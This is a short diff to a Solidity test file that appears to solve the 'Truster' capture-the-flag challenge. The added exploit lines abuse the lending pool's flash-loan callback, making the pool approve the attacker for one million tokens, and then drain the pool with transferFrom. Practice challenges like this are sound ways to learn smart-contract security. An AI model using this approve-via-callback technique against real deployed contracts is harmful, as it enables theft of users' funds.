@@ -41,6 +41,17 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        uint ONE_MILLION = 1_000_000 ether;
+
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature('approve(address,uint256)', address(attacker), ONE_MILLION);
+        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), data);
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), ONE_MILLION);
+        vm.stopPrank();
+
+
+        // vm.startPrank(trusterLenderPool);
+        // vm.stopPrank();
 
         /**
          * EXPLOIT END *
